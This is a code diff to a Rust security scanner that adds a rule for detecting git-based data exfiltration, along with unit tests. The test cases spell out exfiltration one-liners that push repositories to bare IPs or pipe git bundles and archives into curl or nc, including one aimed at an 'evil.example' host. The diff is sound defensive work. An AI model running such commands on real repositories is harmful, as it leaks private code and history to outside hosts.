@@ -17,6 +17,7 @@ pub fn rules() -> Vec<Rule> {
         ex_013(),
         ex_014(),
         ex_015(),
+        ex_016(),
     ]
 }
 
@@ -493,6 +494,42 @@ fn ex_015() -> Rule {
         cwe_ids: &["CWE-506", "CWE-912"],
     }
 }
+
+fn ex_016() -> Rule {
+    Rule {
+        id: "EX-016",
+        name: "Git remote exfiltration",
+        description: "Detects data exfiltration through git: adding/pushing to a remote at a bare IP address, rewriting the origin URL to a bare IP, or piping a repository bundle/archive into a network tool (MITRE T1567, T1048)",
+        severity: Severity::Critical,
+        category: Category::Exfiltration,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // git remote add <name> <scheme>://<bare-ip>... — IP-only git remotes are almost never legitimate
+            Regex::new(r"git\s+remote\s+add\s+\S+\s+\w+://\d{1,3}(\.\d{1,3}){3}")
+                .expect("EX-016: invalid regex"),
+            // git push <scheme>://<bare-ip>...
+            Regex::new(r"git\s+push\s+\w+://\d{1,3}(\.\d{1,3}){3}").expect("EX-016: invalid regex"),
+            // git config remote.<name>.url <scheme>://<bare-ip>...
+            Regex::new(r"git\s+config\s+[^\n]*remote\.[^\n]*url\s+\w+://\d{1,3}(\.\d{1,3}){3}")
+                .expect("EX-016: invalid regex"),
+            // git bundle/archive piped straight into a network tool
+            Regex::new(r"git\s+(bundle|archive)\b[^\n|]*\|\s*(curl|wget|nc\b|ncat)")
+                .expect("EX-016: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("EX-016: invalid regex"),
+            // Loopback / unspecified addresses (local testing, not exfiltration)
+            Regex::new(r"127\.0\.0\.1|0\.0\.0\.0|localhost").expect("EX-016: invalid regex"),
+        ],
+        message: "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+        recommendation: "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history.",
+        fix_hint: Some(
+            "Push only to reviewed, named hosts (e.g. github.com). Remove IP-address remotes and bundle-to-network pipelines.",
+        ),
+        cwe_ids: &["CWE-200", "CWE-506"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -649,5 +686,47 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ex_015.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ex_015", findings);
+    }
+
+    #[test]
+    fn test_ex_016() {
+        let rule = ex_016();
+        let test_cases = vec![
+            // Malicious: git remotes/pushes to bare IPs and bundle-to-network pipes
+            ("git remote add exfil http://192.168.1.50/loot.git", true),
+            ("git remote add backup git://45.9.148.3/repo.git", true),
+            ("git push http://10.0.0.1:8080/loot HEAD", true),
+            ("git config remote.origin.url http://45.9.148.3/x.git", true),
+            (
+                "git bundle create - --all | curl -X POST --data-binary @- http://evil.example",
+                true,
+            ),
+            ("git archive --format=tar HEAD | nc 203.0.113.9 4444", true),
+            // Benign: named hosts, local bundles, loopback
+            (
+                "git remote add origin https://github.com/user/repo.git",
+                false,
+            ),
+            ("git push origin main", false),
+            ("git bundle create backup.bundle --all", false),
+            ("git archive --format=tar -o site.tar HEAD", false),
+            ("git remote add upstream git@github.com:org/repo.git", false),
+            ("git push http://127.0.0.1:9000/local HEAD", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "EX-016: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ex_016() {
+        let rule = ex_016();
+        let content = include_str!("../../../tests/fixtures/rules/ex_016.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ex_016", findings);
     }
 }
